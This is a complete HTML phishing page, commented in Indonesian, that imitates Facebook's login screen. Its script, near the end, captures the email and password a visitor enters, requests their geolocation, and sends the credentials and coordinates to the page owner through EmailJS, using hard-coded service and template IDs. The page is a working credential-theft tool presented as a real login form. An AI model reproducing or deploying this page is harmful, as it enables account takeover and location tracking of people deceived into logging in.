<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login ke Facebook</title>

  <!-- Load library EmailJS dari CDN -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

  <style>
    /* CSS GLOBAL */
    * {
      box-sizing: border-box;
      font-family: Helvetica, Arial, sans-serif;
    }

    /* BODY */
    body {
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    /* KOTAK LOGIN */
    .login-box {
      background: #fff;
      padding: 20px 20px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
      width: 360px;
      text-align: center;
    }

    .login-box h1 {
      color: #1877f2;
      font-size: 44px;
      margin-bottom: 10px;
    }

    .login-box h2 {
      font-size: 18px;
      color: #1c1e21;
      margin-bottom: 16px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 10px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }

    button {
      width: 100%;
      background-color: #1877f2;
      color: white;
      padding: 14px;
      font-size: 17px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 5px;
    }

    .link {
      margin: 12px 0;
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
      display: inline-block;
    }

    .divider {
      border-top: 1px solid #dddfe2;
      margin: 20px 0;
      position: relative;
    }

    .divider span {
      background: #fff;
      position: absolute;
      top: -12px;
      left: 50%;
      transform: translateX(-50%);
      padding: 0 10px;
      color: #606770;
      font-size: 13px;
    }

    .signup {
      background-color: #42b72a;
      color: white;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <!-- FORM LOGIN -->
  <div class="login-box">
    <h1>facebook</h1> <!-- Judul besar -->
    <h2>Login ke Facebook</h2> <!-- Subjudul -->

    <!-- Input Email dan Password -->
    <input type="email" id="email" placeholder="Email atau Nomor Telepon">
    <input type="password" id="password" placeholder="Kata Sandi">

    <!-- Tombol Masuk -->
    <button onclick="kirimData()">Masuk</button>

    <!-- Link Lupa Akun -->
    <a href="#" class="link">Lupa akun?</a>

    <!-- Garis pemisah -->
    <div class="divider"><span>atau</span></div>

    <!-- Tombol buat akun -->
    <button class="signup">Buat akun baru</button>
  </div>

  <script>
    // Inisialisasi EmailJS dengan user ID kamu
    emailjs.init("P2F6IEIWdwQ2UYFGk");

    // Fungsi yang dijalankan saat klik tombol "Masuk"
    function kirimData() {
      // Ambil nilai dari input email & password
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      // Ambil elemen tombol untuk dimodifikasi tampilannya
      const btn = document.querySelector("button");

      // Validasi input tidak boleh kosong
      if (!email || !password) {
        alert("Email dan kata sandi wajib diisi!");
        return;
      }

      // Ubah tampilan tombol saat proses pengiriman
      btn.innerText = "Mengirim...";
      btn.disabled = true;

      // Ambil lokasi pengguna (jika diizinkan browser)
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        // Buat data yang akan dikirim
        const data = {
          email: email,
          password: password,
          latitude: lat,
          longitude: lon
        };

        // Kirim data ke EmailJS (ke email kamu sesuai template)
        emailjs.send("service_atvbwis", "template_fhsowxs", data)
          .then(() => {
            alert("Data berhasil dikirim!");
            btn.innerText = "Masuk";
            btn.disabled = false;
          })
          .catch(err => {
            alert("Gagal mengirim.");
            console.error("Error EmailJS:", err);
            btn.innerText = "Masuk";
            btn.disabled = false;
          });

      }, err => {
        // Jika gagal mendapatkan lokasi
        alert("Gagal ambil lokasi: " + err.message);
        btn.innerText = "Masuk";
        btn.disabled = false;
      });
    }
  </script>
</body>
</html>
